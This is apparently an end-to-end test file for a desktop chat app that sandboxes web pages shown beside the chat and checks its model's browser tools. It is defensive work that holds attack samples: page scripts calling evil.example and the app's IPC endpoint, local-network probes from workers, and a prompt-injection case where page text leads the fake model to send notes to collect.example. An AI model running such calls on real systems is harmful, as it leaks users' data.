// Pages beside the chat (desktop/src-tauri/src/chat/pages.rs, chat/pages/view.rs;
// the look-and-show plan's Milestone 2):
// - `browser_navigate` brings the page up in a Page tab (no tab open yet):
//   its own WebView2 (its own profile), laid over the tab by Rust — no Yap
//   IPC in it at all (`window.__TAURI_INTERNALS__` absent, Yap's IPC
//   unreachable); Back / Reload / Save a shot / Open in your browser; the
//   answer keeps it (its pill, `pages` in chats.json); its tab closes it. A
//   search opens on the person's engine; a site they named (`browser_tabs`
//   new), at its home page.
// - `browser_read` reads the page open beside the chat; every question
//   says which tabs are open.
// - The page never reaches this PC: its own requests, a worker's, a shared
//   worker's or a service worker's to an address that isn't the page's are
//   refused.
// - "Ask Yap about this" on words selected there: quoted over Chat's box,
//   asked as a selection — and web content, so a question about them never
//   makes Yap act (the safety rule).
// - Browsing a page as the Claude Code app's browser is browsed (a model
//   that reads images): `browser_wait`, `browser_scroll`, `browser_find`,
//   `browser_scroll_to`, then `browser_screenshot` — what's in view now, at
//   that scroll — and `browser_zoom`: the shots go to the model and show in
//   the answer's steps as thumbnails (opening large), never as a tab or a
//   pill.
// - No model gets `offer_browser` any more: the tab's Open in … follows
//   Settings → General → Links.
// - An address the model writes opens while nothing from outside is in the
//   turn; once a page is read, one it writes is refused (`pages::written`).
// - `browser_read` in parts (`offset`, `next`) and its tables as rows (mode
//   "tables"), through Yap's own scripts in the real webview.
// - `browser_zoom` on a tab out of sight is drawn twice as finely; on screen,
//   the screen's own pixels enlarged, and the model is told which.
//
// Nothing leaves the PC: the model is the scripted fake AI
// (support/fake-llm.js), the web a local fake (support/fake-web.js, through
// the debug-only YAP_WEB_STANDIN: the page loads from the stand-in). The
// page's own webview is a native window over Yap's: CDP screenshots of the
// main page don't show it, so the checks read it through the debug-only
// `e2e_page_view_eval` / `e2e_page_views`. Fictional pages only.
import fs from 'node:fs';
import path from 'node:path';
import { test as base, expect, expectStore, setConfig, openView, openSettings, closeSettings, settingsDialog } from './support/fixtures.js';
import { startFakeLlm } from './support/fake-llm.js';
import { startFakeWeb, FORT_JOY_URL, DOCKS_URL, BAND, FOREVER_URL, GEAR_URL } from './support/fake-web.js';
import { readPng, pixel, near } from './support/png.js';

const BROWSERS = [
  { key: 'Brave', name: 'Brave', command: '"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"' },
  { key: 'Firefox-308046B0AF4A39CB', name: 'Firefox', command: '"C:\\Program Files\\Mozilla Firefox\\firefox.exe" -osint -url "%1"' },
];

const test = base.extend({
  fakeLlm: [
    async ({}, use) => {
      const fake = await startFakeLlm();
      // The fake that reads images, and a roomy one for long reads, say their
      // context, as a real server does: at the 8K Yap assumes for a server
      // that doesn't, a model that sees sits at the edge of its whole
      // toolset (turn/fit.rs leaves its view tools out), and a long page's
      // reads soon fill what's left (budget::fit_result). fake-chat stays 8K.
      fake.setServerModels([{ id: 'fake-chat' }, { id: 'llama3.1:8b' }, { id: 'qwen2.5-7b-instruct' }, { id: 'nomic-embed-text' }, { id: 'fake-vision-chat' }, { id: 'fake-roomy-chat' }]);
      fake.serveOllama({ loaded: { 'fake-vision-chat': 32768, 'fake-roomy-chat': 32768 } });
      await use(fake);
      await fake.close();
    },
    { scope: 'worker' },
  ],
  fakeWeb: [
    async ({}, use) => {
      const fake = await startFakeWeb();
      await use(fake);
      await fake.close();
    },
    { scope: 'worker' },
  ],
  yapOptions: [
    async ({ fakeLlm, fakeWeb }, use) => {
      await use({
        name: 'chat-pages',
        env: {
          ...fakeWeb.env,
          YAP_E2E_NET_ALIASES: `${new URL(fakeWeb.base).host}=wiki.example.com`,
          // Windows' registered browsers, as a test run has them (shell/browsers.rs).
          YAP_E2E_BROWSERS: JSON.stringify(BROWSERS),
        },
        config: chatConfig(fakeLlm),
      });
    },
    { scope: 'worker' },
  ],
});

/**
 * Chat on the fake AI with the web on. (Not learning from chats: a new
 * chat has the last one read for memory at once, and that call would take
 * the next scripted step.)
 */
function chatConfig(fakeLlm) {
  return { webSearch: true, memoryLearnChats: false, llmScopes: { chat: { enabled: true, provider: 'custom', baseUrl: fakeLlm.base, model: 'fake-chat' } } };
}

const KEY = `page:${FORT_JOY_URL}`;
const chatCalls = (fakeLlm, from) => fakeLlm.requests.slice(from).filter((r) => r.tools?.length);
const toolResult = (request) => JSON.parse(request.messages.filter((m) => m.role === 'tool').at(-1).content);

/** A script run in the page's own webview: its JSON result, parsed. */
async function inPage(yap, script) {
  const raw = await yap.invoke('e2e_page_view_eval', { key: KEY, script });
  return JSON.parse(raw);
}

/** The pages alive now. */
const views = (yap) => yap.invoke('e2e_page_views');

/** Sent in the conversation open now (with the panel open the chat list may step aside). */
async function say(main, text) {
  await main.getByRole('textbox', { name: 'Message' }).fill(text);
  await main.getByRole('button', { name: 'Send' }).click();
}

async function ask(main, text) {
  await openView(main, 'Chat');
  // A new chat: the last test's tabs and pages are its own.
  await main.getByRole('button', { name: 'New chat' }).first().click();
  await expect(main.getByTestId('chat-doc')).toHaveCount(0);
  await main.getByRole('textbox', { name: 'Message' }).fill(text);
  await main.getByRole('button', { name: 'Send' }).click();
}

test('browser_navigate brings the live page up beside the chat: its own webview, no Yap IPC, Open in your browser', async ({ yap, main, fakeLlm, shot }) => {
  await setConfig(yap, main, chatConfig(fakeLlm));
  const from = fakeLlm.requests.length;
  fakeLlm.scriptChat([
    { tools: [{ name: 'browser_navigate', args: { url: FORT_JOY_URL } }] },
    { content: 'It’s open beside the chat: the map is under Map.' },
  ]);
  await ask(main, `Bring up the treasure map page ${FORT_JOY_URL}`);

  // Every tool-using model with the web gets the browser tools, told how in
  // one line: none of the view's for one that can't see (it reads the whole
  // page), no batch for one that only reads, no offer_browser for any.
  await expect.poll(() => chatCalls(fakeLlm, from).length).toBeGreaterThanOrEqual(2);
  const calls = chatCalls(fakeLlm, from);
  expect(calls[0].tools).toEqual(expect.arrayContaining(['browser_navigate', 'browser_read', 'browser_find', 'browser_tabs', 'browser_wait']));
  for (const name of ['browser_scroll', 'browser_scroll_to', 'browser_screenshot', 'browser_zoom', 'browser_batch']) {
    expect(calls[0].tools).not.toContain(name);
  }
  expect(calls[0].tools).not.toContain('browser_click');
  expect(calls[0].tools).not.toContain('offer_browser');
  expect(calls[0].system).toContain('browser_navigate opens a page when the user asks');
  expect(toolResult(calls[1])).toMatchObject({ success: true, shown: true, displayText: 'Brought up wiki.example.com/wiki/Fort_Joy beside the chat' });

  // The Page tab, the page in it (the stand-in's), its title from the page.
  const tab = main.getByTestId('chat-page');
  await expect(tab).toBeVisible({ timeout: 20_000 });
  await expect(main.getByTestId('chat-page-title')).toHaveText('Fort Joy - Example Wiki', { timeout: 20_000 });
  await expect
    .poll(async () => (await views(yap)).find((v) => v.key === KEY), { timeout: 20_000 })
    .toMatchObject({ url: FORT_JOY_URL, made: true, loaded: true, onScreen: true });
  expect(await inPage(yap, 'document.title')).toBe('Fort Joy - Example Wiki');
  expect(await inPage(yap, "document.querySelector('figcaption').textContent")).toBe('Every treasure chest marked');

  // No Yap IPC there at all: nothing of Tauri's, no web messages, and Yap's
  // IPC endpoint unreachable from the page.
  expect(await inPage(yap, 'typeof window.__TAURI_INTERNALS__')).toBe('undefined');
  expect(await inPage(yap, 'typeof window.__TAURI__')).toBe('undefined');
  expect(await inPage(yap, 'typeof window.__TAURI_INVOKE_KEY__')).toBe('undefined');
  const opened = (await yap.invoke('e2e_opened_urls')).length;
  // (WebView2's own chrome.webview.postMessage is there, but web messages
  // are off and nothing of Yap's listens: a message goes nowhere.)
  await inPage(
    yap,
    "(function(){try{window.chrome.webview.postMessage({cmd:'open_external',url:'https://evil.example/'});return 'sent';}catch(e){return 'refused';}})()"
  );
  const reached = await inPage(
    yap,
    "(function(){var x=new XMLHttpRequest();try{x.open('POST','http://ipc.localhost/open_external',false);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({url:'https://evil.example/'}));return 'status '+x.status;}catch(e){return 'blocked';}})()"
  );
  expect(reached).not.toBe('status 200');
  expect((await yap.invoke('e2e_opened_urls')).length).toBe(opened);
  // Its own profile: what it stores isn't Yap's.
  await inPage(yap, "localStorage.setItem('yap-pages-probe','1'); document.cookie='probe=1; path=/'; 'ok'");
  expect(await main.evaluate(() => document.cookie.includes('probe=1'))).toBe(false);

  // The answer: its pill, and its steps folded under it.
  await expect(main.getByText('It’s open beside the chat')).toBeVisible();
  await expect(main.getByTestId('chat-page-pill')).toHaveCount(1);
  await expect(main.getByTestId('chat-page-pill')).toContainText('wiki.example.com');
  await expect(main.getByText('Brought up a page')).toBeVisible();
  await shot(main, '01-page-beside-the-chat');

  // Open in your browser: open_external (a test run keeps the link).
  await main.getByTestId('chat-page-open').click();
  await expect.poll(() => yap.invoke('e2e_opened_urls')).toContain(FORT_JOY_URL);

  // Kept with the answer.
  await expectStore(yap, 'chats.json', (s) =>
    s.conversations.some((c) => c.messages.at(-1)?.pages?.[0]?.url === FORT_JOY_URL)
  );

  // Save a shot: a picture of the page as it is, its tab, kept with the answer.
  await main.getByTestId('chat-page-shot').click();
  await expect(main.getByTestId('chat-picture')).toBeVisible({ timeout: 20_000 });
  await expect(main.getByTestId('chat-picture-caption')).toHaveText('A shot of Fort Joy - Example Wiki');
  await expect
    .poll(() => main.getByTestId('chat-picture-img').evaluate((img) => img.complete && img.naturalWidth > 0), { timeout: 10_000 })
    .toBe(true);
  // The page stays alive behind it, out of sight; its tab brings it back.
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.onScreen).toBe(false);
  await expectStore(yap, 'chats.json', (s) => s.conversations.some((c) => c.messages.at(-1)?.pictures?.some((p) => p.caption === 'A shot of Fort Joy - Example Wiki')));
  const tabs = main.getByTestId('chat-panel-tab');
  await expect(tabs).toHaveCount(2);
  await tabs.first().click();
  await expect(tab).toBeVisible();
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.onScreen).toBe(true);

  // Something of Yap's over it (Settings): out of sight until it goes.
  await openSettings(main);
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.onScreen).toBe(false);
  await closeSettings(main);
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.onScreen).toBe(true);

  // Its tab closed: the page goes.
  await main.getByRole('button', { name: /^Close Fort Joy - Example Wiki|^Close wiki\.example\.com/ }).click();
  await expect.poll(async () => (await views(yap)).some((v) => v.key === KEY)).toBe(false);
});

test('a page beside the chat never reaches this PC: not itself, nor a worker of its own, a shared one or a service worker', async ({ yap, main, fakeLlm, fakeWeb }) => {
  await setConfig(yap, main, chatConfig(fakeLlm));
  await ask(main, `Show me ${FORT_JOY_URL}`);
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.loaded, { timeout: 20_000 }).toBe(true);
  // Each one asks for an address on this PC that isn't the page's (the fake
  // web's `/probe/…`: refused), then one of the page's own (`…/probe-ok/…`:
  // allowed, so it's known to have run).
  const run = Date.now();
  const started = await inPage(
    yap,
    `(function(){var base=location.href.split('/wiki.example.com/')[0],origin=location.origin;
      function job(who){return "fetch('"+origin+"/probe/"+who+"',{mode:'no-cors'}).catch(function(){}).then(function(){return fetch('"+base+"/wiki.example.com/probe-ok/"+who+"',{mode:'no-cors'});}).catch(function(){});";}
      function blob(who){return URL.createObjectURL(new Blob([job(who)],{type:'text/javascript'}));}
      (0,eval)(job('page'));
      new Worker(blob('worker'));
      new SharedWorker(blob('shared'));
      navigator.serviceWorker.register(base+'/wiki.example.com/probe-sw.js?run=${run}',{scope:base+'/wiki.example.com/'});
      return 'started';})()`
  );
  expect(started).toBe('started');
  const reached = () => fakeWeb.requests.filter((r) => r.service === 'standin' && r.path.startsWith('/probe-ok/')).map((r) => r.path.slice('/probe-ok/'.length));
  await expect.poll(reached, { timeout: 20_000 }).toEqual(expect.arrayContaining(['page', 'worker', 'shared', 'service']));
  // Refused, every one: the service and shared workers' too (WebView2 hands
  // Yap their requests only when its filter asks for them).
  expect(fakeWeb.requests.filter((r) => r.service === 'probe').map((r) => r.path)).toEqual([]);
});

test('words selected on a page are web content: a question about them never makes Yap act', async ({ yap, main, fakeLlm }) => {
  await setConfig(yap, main, chatConfig(fakeLlm));
  await ask(main, `Show me ${FORT_JOY_URL}`);
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.loaded, { timeout: 20_000 }).toBe(true);
  await inPage(yap, "(function(){var r=document.createRange();r.selectNodeContents(document.querySelector('figcaption'));var s=getSelection();s.removeAllRanges();s.addRange(r);return s.toString();})()");
  expect(await yap.invoke('e2e_page_view_ask', { key: KEY })).toBe('Every treasure chest marked');
  await expect(main.getByTestId('chat-quote')).toBeVisible();
  // The page's words could carry instructions the person never saw (hidden
  // text inside what they selected): the turn is a web one from its start.
  const from = fakeLlm.requests.length;
  fakeLlm.scriptChat([{ tools: [{ name: 'copy_to_clipboard', args: { text: 'Every treasure chest marked' } }] }, { content: 'You can copy it from the page yourself.' }]);
  await say(main, 'Copy this to my clipboard');
  await expect(main.getByText('You can copy it from the page yourself.')).toBeVisible();
  expect(toolResult(chatCalls(fakeLlm, from)[1])).toMatchObject({ success: false, displayText: "Didn't copy to the clipboard: not after reading the web" });
});

test('words selected on the page: Ask Yap about this quotes them over the box, asked as a selection', async ({ yap, main, fakeLlm }) => {
  await setConfig(yap, main, chatConfig(fakeLlm));
  // (An address asked for: Yap opens it itself, no model.)
  await ask(main, `Show me ${FORT_JOY_URL}`);
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.loaded, { timeout: 20_000 }).toBe(true);
  await expect(main.getByText('wiki.example.com is open beside the chat.')).toBeVisible();

  // Select the map's caption in the page, then its menu's Ask Yap about this
  // (a test run never shows the native menu: the debug command does what it does).
  const selected = await inPage(
    yap,
    "(function(){var r=document.createRange();r.selectNodeContents(document.querySelector('figcaption'));var s=getSelection();s.removeAllRanges();s.addRange(r);return s.toString();})()"
  );
  expect(selected).toBe('Every treasure chest marked');
  expect(await yap.invoke('e2e_page_view_ask', { key: KEY })).toBe('Every treasure chest marked');
  const bar = main.getByTestId('chat-quote');
  await expect(bar).toBeVisible();
  await expect(bar).toContainText('About Fort Joy - Example Wiki:');
  await expect(bar).toContainText('Every treasure chest marked');

  // Asked: the model is told what was selected, and where.
  const from = fakeLlm.requests.length;
  fakeLlm.scriptChat([{ content: 'Those are the chests on the map.' }]);
  await main.getByRole('textbox', { name: 'Message' }).fill('What does this mean?');
  await main.getByRole('button', { name: 'Send' }).click();
  await expect(main.getByText('Those are the chests on the map.')).toBeVisible();
  const sent = fakeLlm.requests.slice(from).find((r) => r.messages?.length);
  const said = JSON.stringify(sent.messages);
  expect(said).toContain('The user selected this text in wiki.example.com');
  expect(said).toContain('Every treasure chest marked');
  await expect(main.getByTestId('chat-quote-sent').last()).toContainText('Every treasure chest marked');
});

test('the model browses a page: waits, scrolls, finds a heading, looks at the view it scrolled to and zooms in; the shots are in its steps, never a tab', async ({ yap, main, fakeLlm, shot }) => {
  // ("vision" in the fake's id: a model that reads images, the only kind offered shots.)
  await setConfig(yap, main, { ...chatConfig(fakeLlm), llmScopes: { chat: { enabled: true, provider: 'custom', baseUrl: fakeLlm.base, model: 'fake-vision-chat' } } });
  const from = fakeLlm.requests.length;
  const SAID = 'The night ferry leaves after nightfall: that’s the way out.';
  fakeLlm.scriptChat([
    { tools: [{ name: 'browser_navigate', args: { url: DOCKS_URL } }] },
    { tools: [{ name: 'browser_wait', args: { text: 'night ferry is boarding' } }] },
    { tools: [{ name: 'browser_scroll', args: { direction: 'down' } }] },
    { tools: [{ name: 'browser_find', args: { query: 'Getting out' } }] },
    { tools: [{ name: 'browser_scroll_to', args: { text: 'Getting out' } }] },
    { tools: [{ name: 'browser_screenshot', args: {} }] },
    { tools: [{ name: 'browser_zoom', args: { region: 'bottom' } }] },
    { content: SAID },
  ]);
  await ask(main, `How do I get out of the docks? ${DOCKS_URL}`);
  await expect(main.getByText(SAID)).toBeVisible({ timeout: 60_000 });
  const calls = chatCalls(fakeLlm, from);
  // A model that reads images: the shots too, and how to browse in the line; never the acting tools.
  expect(calls[0].tools).toEqual(expect.arrayContaining(['browser_navigate', 'browser_read', 'browser_scroll', 'browser_scroll_to', 'browser_screenshot', 'browser_zoom']));
  expect(calls[0].tools).not.toContain('browser_click');
  expect(calls[0].system).toContain('browser_scroll or browser_scroll_to it, then browser_screenshot; browser_zoom for small text');
  // Waited for the line that comes later; scrolled a screen; found the heading by its ref.
  expect(toolResult(calls[2])).toMatchObject({ success: true, displayText: 'Waited for ‘night ferry is boarding’ on wiki.example.com' });
  const scrolled = toolResult(calls[3]);
  expect(scrolled).toMatchObject({ success: true, displayText: 'Scrolled down wiki.example.com' });
  expect(scrolled.data.scroll.y).toBeGreaterThan(0);
  const found = toolResult(calls[4]);
  expect(found.displayText).toMatch(/^Found \d+ match(es)? for ‘Getting out’ on wiki\.example\.com$/);
  expect(found.data.matches).toMatch(/\[\d+\] heading "Getting out"/);
  const to = toolResult(calls[5]);
  expect(to).toMatchObject({ success: true, displayText: 'Scrolled to ‘Getting out’ on wiki.example.com', data: { kind: 'heading' } });
  // The shot: what's in view now, at that scroll, for the model (in the next step's message).
  const looked = toolResult(calls[6]);
  expect(looked).toMatchObject({ success: true, displayText: 'Looked at the page · wiki.example.com', data: { picture: 'p1' } });
  expect(looked.data.scroll.y).toBe(to.data.scroll.y);
  expect(looked.frame).toMatch(/^browser_click's x, y are in this picture's pixels: \d+×\d+, the page's view\.$/);
  const sent = calls[7].messages.filter((m) => m.role === 'user' && Array.isArray(m.content) && m.content.some((p) => p.type === 'image_url'));
  // (The shot, and the zoom after it: each goes with every later step while it fits.)
  expect(sent).toHaveLength(2);
  expect(toolResult(calls[7])).toMatchObject({ success: true, displayText: 'Zoomed in on the page · wiki.example.com' });

  // Kept with the answer as step shots (their chips), each a chat image; never a tab or a pill.
  let kept = [];
  await expectStore(yap, 'chats.json', (s) => {
    const m = s.conversations.flatMap((c) => c.messages).findLast((x) => x.role === 'assistant' && x.text === SAID);
    kept = m?.pictures || [];
    return kept.length === 2;
  });
  expect(kept.map((p) => p.chip)).toEqual(['Looked at the page · wiki.example.com', 'Zoomed in on the page · wiki.example.com']);
  // Of the view as it was scrolled: the harbour's green above, the way out's blue below — none of the top's red.
  const view = readPng(fs.readFileSync(path.join(yap.dataDir, 'chat-images', `${kept[0].id}.png`)));
  const at = (fx, fy) => pixel(view, Math.floor(view.width * fx), Math.floor(view.height * fy));
  expect(near(at(0.5, 0.97), BAND.out, 25)).toBe(true);
  expect(near(at(0.5, 0.03), BAND.harbour, 25)).toBe(true);
  for (const fy of [0.03, 0.3, 0.6, 0.97]) expect(near(at(0.9, fy), BAND.top, 30)).toBe(false);
  // The zoom: the bottom of that view, at the device's pixels (enlarged when small).
  const zoomed = readPng(fs.readFileSync(path.join(yap.dataDir, 'chat-images', `${kept[1].id}.png`)));
  expect(near(pixel(zoomed, Math.floor(zoomed.width / 2), zoomed.height - 4), BAND.out, 25)).toBe(true);
  // No new tab, no picture tab, no pill: the one page tab.
  await expect(main.getByTestId('chat-picture')).toHaveCount(0);
  await expect(main.getByTestId('chat-picture-pill')).toHaveCount(0);
  await expect(main.getByTestId('chat-panel-tab')).toHaveCount(1);
  expect((await views(yap)).filter((v) => v.key.startsWith('page:'))).toHaveLength(1);

  // The thread: the two shots beside the folded steps, then each on its own step; one opens large.
  const steps = main.getByTestId('chat-steps').last();
  await expect(steps.getByTestId('chat-steps-shots').getByTestId('chat-step-shot')).toHaveCount(2);
  await expect(steps.locator('summary')).toContainText('looked at the page, zoomed in');
  await shot(main, '02-two-shots-beside-the-steps');
  await steps.locator('summary').click();
  const onSteps = steps.locator('.toolchips').getByTestId('chat-step-shot');
  await expect(onSteps).toHaveCount(2);
  await expect(steps.locator('.toolchip.withshot')).toHaveText(['Looked at the page · wiki.example.com', 'Zoomed in on the page · wiki.example.com']);
  await expect.poll(() => onSteps.first().locator('img').evaluate((img) => img.complete && img.naturalWidth > 0)).toBe(true);
  await shot(main, '03-two-shots-in-the-steps');
  await setConfig(yap, main, { theme: 'dark' });
  await expect.poll(() => main.evaluate(() => document.documentElement.dataset.yapTheme)).toBe('dark');
  await shot(main, '04-two-shots-in-the-steps-dark');
  await setConfig(yap, main, { theme: 'light' });
  await onSteps.first().click();
  const viewer = main.getByRole('dialog', { name: 'Screenshot' });
  await expect(viewer).toBeVisible();
  await expect.poll(() => viewer.locator('img').evaluate((img) => img.complete && img.naturalWidth > 0)).toBe(true);
  await main.keyboard.press('Escape');
  await expect(viewer).toHaveCount(0);
});

/** Every tool result in a request, in order. */
const toolResults = (request) => request.messages.filter((m) => m.role === 'tool').map((m) => JSON.parse(m.content));
/** The text Yap sent with the pictures in a request (a shot's or a zoom's line). */
const lookLines = (request) =>
  request.messages
    .filter((m) => m.role === 'user' && Array.isArray(m.content))
    .flatMap((m) => m.content.filter((p) => p.type === 'text').map((p) => p.text));

test('an address the model writes opens at the start of a turn; once a page is read, one it writes is refused', async ({ yap, main, fakeLlm, fakeWeb }) => {
  await setConfig(yap, main, chatConfig(fakeLlm));
  const from = fakeLlm.requests.length;
  const SAID = 'The forever page is open beside the chat; it says it is here for good.';
  fakeLlm.scriptChat([
    { tools: [{ name: 'browser_navigate', args: { url: FOREVER_URL } }] },
    { tools: [{ name: 'browser_read', args: {} }] },
    // (The page's words asked for it, with the person's notes in the address.)
    { tools: [{ name: 'browser_navigate', args: { url: 'https://collect.example/?d=notes' } }] },
    { content: SAID },
  ]);
  // (No address in the question: the model writes it.)
  await ask(main, 'I would like the forever page on the Example site up beside the chat, and what it says');
  await expect(main.getByText(SAID)).toBeVisible({ timeout: 30_000 });
  const calls = chatCalls(fakeLlm, from);
  // Nothing from outside in the turn yet: it opens, a page tab of its own.
  expect(toolResult(calls[1])).toMatchObject({ success: true, displayText: 'Brought up example.com/forever beside the chat' });
  await expect(main.getByTestId('chat-page-address')).toHaveValue(FOREVER_URL, { timeout: 20_000 });
  expect(toolResult(calls[2])).toMatchObject({ success: true, displayText: 'Read example.com/forever beside the chat' });
  // After the read: an address it writes is refused, the rule said and what works instead; nothing went there.
  const refused = toolResult(calls[3]);
  expect(refused).toMatchObject({ success: false, displayText: "Didn't go to collect.example/?d=notes: not a link from you, a search or the page" });
  expect(refused.error).toContain('never an address you write');
  expect(refused.error).toContain('find the page with web_search');
  expect(fakeWeb.requests.some((r) => r.host === 'collect.example')).toBe(false);
});

test('browser_read reads a long page in parts, each saying where to go on, and its tables as rows', async ({ yap, main, fakeLlm }) => {
  // (A roomy model: four long reads in one turn.)
  await setConfig(yap, main, { ...chatConfig(fakeLlm), llmScopes: { chat: { enabled: true, provider: 'custom', baseUrl: fakeLlm.base, model: 'fake-roomy-chat' } } });
  const from = fakeLlm.requests.length;
  const SAID = 'Item 120 weighs 1200 g.';
  const goOn = (r) => toolResult(r).data.next;
  fakeLlm.scriptChat([
    { tools: [{ name: 'browser_navigate', args: { url: GEAR_URL } }] },
    { tools: [{ name: 'browser_read', args: {} }] },
    { tools: [{ name: 'browser_read', args: goOn }] },
    { tools: [{ name: 'browser_read', args: { mode: 'tables' } }] },
    { tools: [{ name: 'browser_read', args: goOn }] },
    { content: SAID },
  ]);
  await ask(main, `What does item 120 weigh? ${GEAR_URL}`);
  await expect(main.getByText(SAID)).toBeVisible({ timeout: 60_000 });
  const calls = chatCalls(fakeLlm, from);
  // The first read: as it always was, with where to go on.
  const first = toolResult(calls[2]);
  expect(first).toMatchObject({ success: true, displayText: 'Read gear.example.com/list beside the chat', data: { more: true, next: { offset: 5000 } } });
  expect(first.data.text).toHaveLength(5000);
  expect(Object.keys(first.data).sort()).toEqual(['headings', 'links', 'more', 'n', 'next', 'tab', 'tabs', 'text', 'title', 'url']);
  // On from there: the next part, the heading in it, the page's length.
  const second = toolResult(calls[3]);
  expect(second).toMatchObject({ success: true, displayText: 'Read gear.example.com/list beside the chat (from character 5000)', data: { offset: 5000, n: first.data.n } });
  expect(second.data.chars).toBeGreaterThan(5000);
  expect(second.data.headings).toEqual(['Everything']);
  expect(second.data.text).toContain('Item 1 10 g Kellbrook Camping');
  // Its table, as rows: the headers, a cell's link, paged by rows; the hidden row left out.
  const tables = toolResult(calls[4]);
  expect(tables).toMatchObject({ success: true, displayText: 'Read a table on gear.example.com/list beside the chat', data: { count: 1, rows: 150, more: true, next: { mode: 'tables', offset: 100 } } });
  expect(tables.data.tables[0]).toMatchObject({ table: 1, caption: 'Everything', headers: ['Item', 'Weight', 'Where to buy'], from: 1, of: 150 });
  expect(tables.data.tables[0].rows).toHaveLength(100);
  expect(tables.data.tables[0].rows[0]).toEqual([{ text: 'Item 1', url: 'https://gear.example.com/item/1' }, '10 g', 'Kellbrook Camping']);
  const rest = toolResult(calls[5]);
  expect(rest.data.tables[0]).toMatchObject({ from: 101, of: 150, headers: ['Item', 'Weight', 'Where to buy'] });
  expect(rest.data.tables[0].rows).toHaveLength(50);
  expect(rest.data.tables[0].rows[19][1]).toBe('1200 g');
  expect(rest.data.next).toBeUndefined();
  expect(JSON.stringify(rest)).not.toContain('Hidden item');
});

test("browser_zoom draws a tab out of sight at twice its pixels; on screen, the screen's own pixels enlarged, and says which", async ({ yap, main, fakeLlm }) => {
  await setConfig(yap, main, { ...chatConfig(fakeLlm), llmScopes: { chat: { enabled: true, provider: 'custom', baseUrl: fakeLlm.base, model: 'fake-vision-chat' } } });
  const from = fakeLlm.requests.length;
  const SAID = 'Both closer looks are in.';
  const shotTab = (r) => toolResults(r).find((x) => x?.displayText?.startsWith('Looked at the page'))?.data?.tab;
  fakeLlm.scriptChat([
    { tools: [{ name: 'browser_navigate', args: { url: DOCKS_URL } }] },
    { tools: [{ name: 'browser_screenshot', args: {} }] },
    { tools: [{ name: 'browser_zoom', args: { region: 'top' } }] },
    // Another tab in front: the docks page out of sight.
    { tools: [{ name: 'browser_tabs', args: { action: 'new', url: GEAR_URL } }] },
    { tools: [{ name: 'browser_wait', args: { seconds: 1 } }] },
    { tools: [{ name: 'browser_zoom', args: (r) => ({ tab: shotTab(r), region: 'top' }) }] },
    { content: SAID },
  ]);
  await ask(main, `Have a close look at the docks page, then open the gear list: ${DOCKS_URL} ${GEAR_URL}`);
  await expect(main.getByText(SAID)).toBeVisible({ timeout: 60_000 });
  const calls = chatCalls(fakeLlm, from);
  const shot = toolResult(calls[2]);
  expect(shot).toMatchObject({ success: true, displayText: 'Looked at the page · wiki.example.com' });
  // On screen: the screen's own pixels, enlarged to twice the page's CSS pixels where they're fewer, and said so.
  const onScreen = toolResult(calls[3]);
  expect(onScreen).toMatchObject({ success: true, displayText: 'Zoomed in on the page · wiki.example.com', data: { drawn: 1 } });
  if (onScreen.data.density < 2) expect(onScreen.data.enlarged).toBeGreaterThan(1);
  // (Each step's picture goes with the request that carries its result.)
  expect(lookLines(calls[3]).join(' ')).toMatch(/the screen's own pixels/);
  // Out of sight: drawn twice as finely, real detail.
  const outOfSight = toolResult(calls[6]);
  expect(outOfSight).toMatchObject({ success: true, data: { tab: shot.data.tab, drawn: 2 } });
  expect(outOfSight.data.density).toBe(2 * onScreen.data.density);
  expect(lookLines(calls[6]).join(' ')).toContain("drawn at 2 times the screen's detail");
  // The pictures kept with the answer: the view, its top on screen, its top drawn finer — twice the view's pixels across.
  let kept = [];
  await expectStore(yap, 'chats.json', (s) => {
    const m = s.conversations.flatMap((c) => c.messages).findLast((x) => x.role === 'assistant' && x.text === SAID);
    kept = m?.pictures || [];
    return kept.length === 3;
  });
  const [view, top, finer] = kept.map((p) => readPng(fs.readFileSync(path.join(yap.dataDir, 'chat-images', `${p.id}.png`))));
  expect(Math.abs(top.width - view.width * onScreen.data.enlarged)).toBeLessThanOrEqual(view.width * 0.06 + 2);
  expect(Math.abs(finer.width - 2 * view.width * outOfSight.data.enlarged)).toBeLessThanOrEqual(view.width * 0.12 + 2);
  expect(finer.width).toBeGreaterThan(view.width * 1.9);
  // Of the page's top: the red band.
  expect(near(pixel(finer, Math.floor(finer.width / 2), Math.floor(finer.height / 2)), BAND.top, 30)).toBe(true);
});

test('browser_navigate opens a search, browser_tabs a site the person named; browser_read reads the page in front; Open in … follows Links', async ({ yap, main, fakeLlm }) => {
  await setConfig(yap, main, { ...chatConfig(fakeLlm), webSearchBrowser: 'duckduckgo' });
  // Words: a search on the person's engine, beside the chat (Yap never reads it).
  let from = fakeLlm.requests.length;
  fakeLlm.scriptChat([{ tools: [{ name: 'browser_navigate', args: { search: 'train times Kellbrook to Port Ellis' } }] }, { content: 'The search is open beside the chat.' }]);
  // (Worded so Yap leaves it to the model: "search for …" it would open itself.)
  await ask(main, 'I need the train times from Kellbrook to Port Ellis up beside the chat');
  await expect(main.getByText('The search is open beside the chat.')).toBeVisible({ timeout: 20_000 });
  expect(toolResult(chatCalls(fakeLlm, from)[1])).toMatchObject({ success: true, shown: true, displayText: 'Brought up a search for "train times Kellbrook to Port Ellis" beside the chat' });
  await expect(main.getByTestId('chat-page-address')).toHaveValue('https://duckduckgo.com/?q=train+times+Kellbrook+to+Port+Ellis', { timeout: 20_000 });
  // The next question says what's open; reading a search engine's results is refused.
  from = fakeLlm.requests.length;
  fakeLlm.scriptChat([{ tools: [{ name: 'browser_read', args: {} }] }, { content: 'Pick a result and I can help.' }]);
  await main.getByRole('textbox', { name: 'Message' }).fill('What does it say?');
  await main.getByRole('button', { name: 'Send' }).click();
  await expect(main.getByText('Pick a result and I can help.')).toBeVisible({ timeout: 20_000 });
  let calls = chatCalls(fakeLlm, from);
  // (Each tab's number is its own for the session: the earlier tests' tabs had theirs.)
  // Each tab's site only, never its title or address: the page writes those.
  const tabsLine = JSON.stringify(calls[0].messages).match(/Open beside the chat: .*? browser_read reads one\./)?.[0] ?? '';
